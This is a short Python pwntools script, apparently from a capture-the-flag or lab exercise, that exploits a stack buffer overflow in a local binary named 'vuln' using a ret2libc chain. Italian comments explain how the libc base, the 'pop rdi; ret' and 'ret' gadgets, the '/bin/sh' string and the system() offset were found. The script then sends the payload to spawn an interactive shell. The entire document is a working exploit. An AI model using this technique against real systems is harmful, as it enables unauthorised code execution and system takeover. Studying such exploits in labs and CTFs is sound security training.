import sys

from pwn import *

p = process("./vuln")

#pattern search e pattern create 
buf = b'\x55' * 40 


#vvmap primo libc dove c'e start
libc_base = 0x00007ffff7dc4000



#ropper --file /lib/x86_64-linux-gnu/libc.so.6 --search "pop rdi; ret;"
pop_rdi_offset = 0x23b6a

#ropper --file /lib/x86_64-linux-gnu/libc.so.6 --search "ret;"
ret_offset= 0x22679

#strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
bin_sh_offset = 0x1b45bd
#ldd vuln
#readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
system_offset = 0x52290 



pop_rdi = p64(libc_base+pop_rdi_offset)
ret=p64(libc_base+ret_offset)
bin_sh = p64(libc_base+bin_sh_offset)
system_add=p64(libc_base+system_offset)



payload = buf + ret + pop_rdi +bin_sh + system_add

p.sendline(payload)

p.interactive()
